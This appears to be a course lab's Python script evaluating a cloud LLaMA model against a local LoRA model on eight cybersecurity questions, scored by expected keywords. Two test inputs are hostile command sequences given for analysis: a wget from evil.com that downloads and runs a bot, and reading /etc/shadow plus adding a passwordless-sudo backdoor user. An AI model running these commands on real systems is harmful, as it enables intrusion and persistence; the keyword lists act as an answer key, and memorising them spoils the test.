"""
CS 5542 — Week 8 Lab: Evaluation Script
Compare base model vs LoRA-adapted model on domain-specific tasks.
"""

import json
import os
import time
from typing import Optional

# Evaluation dataset — domain-specific cybersecurity questions with ground truth
EVAL_SET = [
    {
        "instruction": "Classify this attack type.",
        "input": "Repeated SSH login attempts with different passwords from single IP at 100 attempts/minute",
        "expected_keywords": ["brute force", "brute_force", "credential"],
        "category": "attack_classification"
    },
    {
        "instruction": "What MITRE ATT&CK technique describes adding a cron job for persistence?",
        "input": "",
        "expected_keywords": ["T1053", "scheduled task", "cron", "persistence"],
        "category": "threat_knowledge"
    },
    {
        "instruction": "Write a SQL query to count attacks by type.",
        "input": "",
        "expected_keywords": ["SELECT", "COUNT", "GROUP BY", "attack_type"],
        "category": "sql_generation"
    },
    {
        "instruction": "Is this session human or automated?",
        "input": "Commands executed: whoami, ls, cd /tmp, wget http://evil.com/bot, chmod +x bot, ./bot. Interval: 0.5s between each.",
        "expected_keywords": ["automated", "bot", "script", "consistent", "timing"],
        "category": "session_classification"
    },
    {
        "instruction": "Explain what a honeypot is and its role in threat intelligence.",
        "input": "",
        "expected_keywords": ["decoy", "attacker", "intelligence", "behavior", "trap"],
        "category": "domain_knowledge"
    },
    {
        "instruction": "Analyze this command sequence for malicious intent.",
        "input": "cat /etc/shadow; useradd backdoor -p $(openssl passwd -1 pass123); echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "expected_keywords": ["privilege", "escalation", "backdoor", "persistence", "shadow"],
        "category": "threat_analysis"
    },
    {
        "instruction": "Write a query to find sessions with data exfiltration indicators.",
        "input": "",
        "expected_keywords": ["SELECT", "curl", "wget", "scp", "exfil"],
        "category": "sql_generation"
    },
    {
        "instruction": "What is the difference between a low-interaction and high-interaction honeypot?",
        "input": "",
        "expected_keywords": ["low", "high", "emulat", "real", "interaction"],
        "category": "domain_knowledge"
    },
]


def keyword_score(response: str, expected_keywords: list[str]) -> float:
    """Score response by keyword presence (0.0-1.0)."""
    response_lower = response.lower()
    hits = sum(1 for kw in expected_keywords if kw.lower() in response_lower)
    return hits / len(expected_keywords) if expected_keywords else 0.0


def evaluate_groq(eval_set: list[dict]) -> list[dict]:
    """Evaluate using Groq API (cloud model)."""
    from groq import Groq
    from dotenv import load_dotenv
    load_dotenv()

    client = Groq(api_key=os.getenv("GROQ_API_KEY"))
    results = []

    for item in eval_set:
        prompt = item["instruction"]
        if item["input"]:
            prompt += f"\n\nInput: {item['input']}"

        start = time.perf_counter()
        resp = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": "You are a cybersecurity analyst specializing in honeypot analysis."},
                {"role": "user", "content": prompt},
            ],
            temperature=0.0,
            seed=42,
        )
        latency = (time.perf_counter() - start) * 1000
        response = resp.choices[0].message.content or ""
        score = keyword_score(response, item["expected_keywords"])
        tokens = resp.usage.total_tokens if resp.usage else 0

        results.append({
            "instruction": item["instruction"],
            "category": item["category"],
            "response": response[:500],
            "score": round(score, 3),
            "latency_ms": round(latency, 1),
            "tokens": tokens,
            "model": "groq/llama-3.3-70b",
        })

    return results


def evaluate_local(eval_set: list[dict], adapter_dir: str = "adapters") -> list[dict]:
    """Evaluate using local LoRA model."""
    from inference import load_model, generate

    if not os.path.isabs(adapter_dir):
        adapter_dir = os.path.join(os.path.dirname(__file__), adapter_dir)

    model, tokenizer = load_model(adapter_dir=adapter_dir)
    results = []

    for item in eval_set:
        result = generate(model, tokenizer, item["instruction"], item.get("input", ""))
        score = keyword_score(result["response"], item["expected_keywords"])

        results.append({
            "instruction": item["instruction"],
            "category": item["category"],
            "response": result["response"][:500],
            "score": round(score, 3),
            "latency_ms": result["latency_ms"],
            "tokens": result["tokens_generated"],
            "model": "local/llama-3.2-1b-lora",
        })

    return results


def compute_summary(results: list[dict]) -> dict:
    """Compute aggregate metrics."""
    scores = [r["score"] for r in results]
    latencies = [r["latency_ms"] for r in results]

    by_category = {}
    for r in results:
        cat = r["category"]
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(r["score"])

    return {
        "model": results[0]["model"] if results else "unknown",
        "avg_score": round(sum(scores) / len(scores), 3) if scores else 0,
        "avg_latency_ms": round(sum(latencies) / len(latencies), 1) if latencies else 0,
        "total_samples": len(results),
        "perfect_scores": sum(1 for s in scores if s >= 1.0),
        "by_category": {
            cat: round(sum(ss) / len(ss), 3)
            for cat, ss in by_category.items()
        },
    }


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--backend", choices=["groq", "local", "both"], default="groq",
                        help="Which model(s) to evaluate")
    args = parser.parse_args()

    all_results = {}

    if args.backend in ("groq", "both"):
        print("Evaluating Groq (LLaMA 3.3 70B)...")
        groq_results = evaluate_groq(EVAL_SET)
        groq_summary = compute_summary(groq_results)
        all_results["groq"] = {"results": groq_results, "summary": groq_summary}
        print(f"  Avg score: {groq_summary['avg_score']} | Avg latency: {groq_summary['avg_latency_ms']}ms")

    if args.backend in ("local", "both"):
        print("Evaluating Local LoRA model...")
        local_results = evaluate_local(EVAL_SET)
        local_summary = compute_summary(local_results)
        all_results["local"] = {"results": local_results, "summary": local_summary}
        print(f"  Avg score: {local_summary['avg_score']} | Avg latency: {local_summary['avg_latency_ms']}ms")

    if args.backend == "both" and "groq" in all_results and "local" in all_results:
        print("\n" + "=" * 60)
        print("COMPARISON")
        print("=" * 60)
        gs = all_results["groq"]["summary"]
        ls = all_results["local"]["summary"]
        print(f"{'Metric':<25} {'Groq 70B':>12} {'Local LoRA':>12}")
        print("-" * 50)
        print(f"{'Avg Score':<25} {gs['avg_score']:>12.3f} {ls['avg_score']:>12.3f}")
        print(f"{'Avg Latency (ms)':<25} {gs['avg_latency_ms']:>12.1f} {ls['avg_latency_ms']:>12.1f}")
        print(f"{'Perfect Scores':<25} {gs['perfect_scores']:>12} {ls['perfect_scores']:>12}")

    out_dir = os.path.join(os.path.dirname(__file__), "results")
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, "evaluation_results.json")
    with open(out_path, "w") as f:
        json.dump(all_results, f, indent=2)
    print(f"\nResults saved to {out_path}")


if __name__ == "__main__":
    main()
